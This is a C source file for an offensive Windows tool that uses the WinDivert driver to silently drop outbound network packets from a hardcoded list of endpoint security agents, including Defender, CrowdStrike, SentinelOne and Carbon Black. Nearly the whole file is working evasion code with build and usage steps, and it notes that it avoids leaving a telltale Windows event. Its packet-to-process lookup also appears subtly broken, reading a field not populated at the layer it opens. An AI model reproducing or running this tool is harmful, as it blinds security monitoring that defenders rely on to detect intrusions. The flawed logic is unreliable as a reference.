/*
 * 16_windivert_edrprison.c
 * WinDivert-based EDR Packet Silencing (EDRPrison approach)
 *
 * Uses the legitimate signed WinDivert driver to intercept ALL outbound packets
 * and silently drop packets originating from identified EDR processes.
 * Unlike WFP filter injection, no WFP filter is created — no Event 5447.
 *
 * Dependencies:
 *   WinDivert library (v2.x): https://reqrypt.org/windivert.html
 *   Download the package and place in same directory:
 *     WinDivert.h
 *     WinDivert.lib (or WinDivert64.lib)
 *     WinDivert64.sys  (must be in same dir as exe at runtime)
 *
 * Build:
 *   cl 16_windivert_edrprison.c /I<path_to_WinDivert> /link WinDivert.lib
 *
 * Usage:
 *   16_windivert_edrprison.exe start [process_name ...]
 *   16_windivert_edrprison.exe start                    (use built-in EDR list)
 *   16_windivert_edrprison.exe start MsSense.exe csfalconservice.exe
 *
 * How it works:
 *   WinDivertOpen intercepts all outbound packets at NETWORK layer.
 *   Each WINDIVERT_ADDRESS contains the ProcessId of the originating process.
 *   If ProcessId matches an EDR, the packet is consumed (not re-injected).
 *   Non-EDR packets are re-injected via WinDivertSend.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <tlhelp32.h>

/* WinDivert headers — must be obtained from https://reqrypt.org/windivert.html */
#include "WinDivert.h"

#pragma comment(lib, "WinDivert.lib")

/* ---- EDR process list ---- */

static const WCHAR *EDR_PROCESSES[] = {
    L"MsMpEng.exe",              /* Windows Defender AV */
    L"MsSense.exe",              /* Microsoft Defender for Endpoint sensor */
    L"SenseCncProxy.exe",        /* MDE command-and-control proxy */
    L"SenseIR.exe",              /* MDE incident response */
    L"csfalconservice.exe",      /* CrowdStrike Falcon */
    L"csagent.exe",              /* CrowdStrike agent */
    L"xagt.exe",                 /* FireEye/Trellix */
    L"elastic-agent.exe",        /* Elastic Agent */
    L"SentinelAgent.exe",        /* SentinelOne */
    L"SentinelServiceHost.exe",  /* SentinelOne service */
    L"cb.exe",                   /* Carbon Black */
    L"CarbonBlack.exe",          /* Carbon Black */
    L"cb_defense_service.exe",   /* VMware Carbon Black */
    L"cyserver.exe",             /* Cybereason */
    L"CylanceSvc.exe",           /* Cylance */
    NULL
};

#define MAX_BLOCKED_PIDS 256
static DWORD g_BlockedPids[MAX_BLOCKED_PIDS];
static int   g_BlockedPidCount = 0;

static volatile BOOL g_Running = TRUE;

static BOOL WINAPI ConsoleHandler(DWORD sig)
{
    if (sig == CTRL_C_EVENT) { g_Running = FALSE; return TRUE; }
    return FALSE;
}

/* Build the blocked PID list from process names */
static void BuildPidList(const WCHAR **names, int nameCount)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (!Process32FirstW(hSnap, &pe)) {
        CloseHandle(hSnap);
        return;
    }

    do {
        for (int i = 0; i < nameCount; i++) {
            if (_wcsicmp(pe.szExeFile, names[i]) == 0) {
                if (g_BlockedPidCount < MAX_BLOCKED_PIDS) {
                    g_BlockedPids[g_BlockedPidCount++] = pe.th32ProcessID;
                    wprintf(L"  [+] Blocking PID %lu: %s\n",
                            pe.th32ProcessID, pe.szExeFile);
                }
            }
        }
    } while (Process32NextW(hSnap, &pe));

    CloseHandle(hSnap);
}

/* Check if a PID is in the block list */
static BOOL IsBlockedPid(DWORD pid)
{
    for (int i = 0; i < g_BlockedPidCount; i++) {
        if (g_BlockedPids[i] == pid) return TRUE;
    }
    return FALSE;
}

/* Main intercept loop */
static void InterceptLoop(HANDLE hDivert)
{
    BYTE        packet[65535];
    UINT        packetLen  = 0;
    WINDIVERT_ADDRESS addr = {0};

    UINT64 dropped  = 0;
    UINT64 passed   = 0;

    wprintf(L"\n[*] Intercepting packets (Ctrl+C to stop)...\n\n");

    while (g_Running) {
        /* Receive next intercepted outbound packet */
        if (!WinDivertRecv(hDivert, packet, sizeof(packet), &packetLen, &addr)) {
            if (!g_Running) break;
            DWORD err = GetLastError();
            if (err == ERROR_NO_DATA) continue; /* timeout, retry */
            wprintf(L"  [-] WinDivertRecv error: %lu\n", err);
            break;
        }

        /* addr.Network.IfIdx does NOT contain PID — the correct field is:
         * WINDIVERT_ADDRESS.Flow.ProcessId (available in WINDIVERT_LAYER_FLOW)
         * OR addr.ProcessId (WinDivert v2.x at NETWORK layer with WINDIVERT_FLAG_SNIFF).
         * For WinDivert 2.x at WINDIVERT_LAYER_NETWORK, use addr.Flow.ProcessId. */
        DWORD pid = addr.Flow.ProcessId;

        if (IsBlockedPid(pid)) {
            /* Drop the packet — do NOT call WinDivertSend */
            dropped++;
            if (dropped % 100 == 1) {
                wprintf(L"  [~] Dropped packet #%llu from PID=%lu\n",
                        (unsigned long long)dropped, pid);
            }
            continue;
        }

        /* Re-inject non-EDR packets so they flow normally */
        UINT sentLen = 0;
        if (!WinDivertSend(hDivert, packet, packetLen, &sentLen, &addr)) {
            /* Ignore send errors — packet is gone already */
        }
        passed++;
    }

    wprintf(L"\n[+] Stats: dropped=%llu, passed=%llu\n",
            (unsigned long long)dropped,
            (unsigned long long)passed);
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] WinDivert EDR Silencer\n\n");

    if (argc < 2 || _wcsicmp(argv[1], L"start") != 0) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s start                   Block all built-in EDR processes\n", argv[0]);
        wprintf(L"  %s start <name1> [name2]   Block specific process names\n", argv[0]);
        wprintf(L"\nRequires:\n");
        wprintf(L"  WinDivert64.sys in same directory as this EXE\n");
        wprintf(L"  Administrator privileges\n");
        return 1;
    }

    /* Determine which processes to block */
    if (argc >= 3) {
        /* Specific process names given on command line */
        wprintf(L"[*] Resolving PIDs for %d specified process(es)...\n", argc - 2);
        BuildPidList((const WCHAR **)(argv + 2), argc - 2);
    } else {
        /* Use built-in EDR list */
        int edrCount = 0;
        while (EDR_PROCESSES[edrCount] != NULL) edrCount++;
        wprintf(L"[*] Resolving PIDs for %d known EDR processes...\n", edrCount);
        BuildPidList(EDR_PROCESSES, edrCount);
    }

    if (g_BlockedPidCount == 0) {
        wprintf(L"\n[~] No matching EDR processes found running.\n");
        wprintf(L"    WinDivert will still open but all packets will be passed through.\n\n");
    } else {
        wprintf(L"\n[*] Will block %d PID(s)\n\n", g_BlockedPidCount);
    }

    /*
     * Open WinDivert at NETWORK layer, OUTBOUND direction only.
     * Filter "outbound" captures all outbound packets at IP layer.
     * Priority 0, no special flags.
     */
    HANDLE hDivert = WinDivertOpen("outbound", WINDIVERT_LAYER_NETWORK, 0, 0);
    if (hDivert == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        wprintf(L"[-] WinDivertOpen failed: %lu\n", err);
        if (err == ERROR_ACCESS_DENIED)
            wprintf(L"    Run as Administrator.\n");
        else if (err == ERROR_FILE_NOT_FOUND)
            wprintf(L"    WinDivert64.sys not found — place in same directory as this EXE.\n");
        return 1;
    }

    wprintf(L"[+] WinDivert opened. Driver loaded.\n");
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    InterceptLoop(hDivert);

    WinDivertClose(hDivert);
    wprintf(L"[+] WinDivert closed. Normal traffic flow restored.\n");
    return 0;
}
